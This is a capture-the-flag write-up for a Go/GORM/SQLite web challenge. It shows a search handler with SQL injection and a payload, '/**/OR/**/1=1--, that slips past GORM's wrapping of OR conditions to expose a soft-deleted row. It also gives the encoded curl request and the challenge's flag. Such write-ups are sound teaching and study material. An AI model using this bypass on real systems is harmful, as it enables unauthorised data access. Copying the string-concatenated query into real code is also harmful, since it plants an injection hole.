# The Hidden Recipe Writeup

## Challenge

- Name: The Hidden Recipe
- Type: Web

## Summary

The app is a Go + GORM + SQLite web service with a search endpoint:

```go
func searchHandler(w http.ResponseWriter, r *http.Request) {
	q := r.URL.Query().Get("q")
	var recipes []Recipe
	db.Where("title LIKE '%" + q + "%'").Find(&recipes)
	searchTmpl.Execute(w, recipes)
}
```

This is SQL injection because user input is concatenated directly into the `WHERE` clause.

The `Secret Recipe` row is not actually removed from the database. GORM soft-deletes it with `deleted_at`, so a normal query hides it:

```go
secret := Recipe{Title: "Secret Recipe", Description: os.Getenv("FLAG")}
db.Create(&secret)
db.Delete(&secret)
```

## Recon

The challenge text provided `https://hidden-recipe.web.ccentf.space`, but that hostname does not resolve.

The correct live host is:

```text
https://hidden-recipe.web.cpctf.space
```

The source zip confirmed the intended bug path.

## Exploit

GORM appends its soft-delete filter automatically, so the effective query is equivalent to:

```sql
SELECT * FROM recipes
WHERE title LIKE '%<q>%'
  AND deleted_at IS NULL;
```

A naive payload like `' OR 1=1 -- ` fails because GORM wraps raw conditions containing literal `" OR "` with parentheses, which breaks the comment-based bypass.

The fix is to split `OR` with block comments so GORM does not detect the substring `" OR "`:

```text
'/**/OR/**/1=1-- 
```

URL-encoded:

```text
%27%2F%2A%2A%2FOR%2F%2A%2A%2F1%3D1--%20
```

Final request:

```bash
curl 'https://hidden-recipe.web.cpctf.space/search?q=%27%2F%2A%2A%2FOR%2F%2A%2A%2F1%3D1--%20'
```

This returns all rows, including the soft-deleted `Secret Recipe`.

## Flag

```text
CPCTF{k!MChI_FR!ed_RiC3_w1th_MaY0nnA1s3}
```
